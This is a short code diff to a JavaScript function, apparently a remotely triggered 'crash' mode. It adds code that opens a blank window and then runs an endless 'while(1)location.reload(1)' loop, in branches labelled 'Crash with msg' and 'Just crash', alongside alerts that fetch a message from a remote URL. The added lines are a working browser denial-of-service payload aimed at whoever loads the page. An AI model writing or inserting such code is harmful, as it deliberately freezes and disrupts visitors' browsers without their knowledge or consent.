@@ -32,10 +32,16 @@ async function ya() {
   if (mode.includes("ym")) {
     // Crash with msg
     alert(await get(url + "/msg"))
+    window.open("about:blank")
+
+        while(1)location.reload(1)
     // console.log("crash")
   } else if (mode.includes("y")) {
     // console.log("crash")
     // Just crash
+    window.open("about:blank")
+
+        while(1)location.reload(1)
   } else if (mode.includes("m")) {
     // only msg
     alert(await get(url + "/msg"))
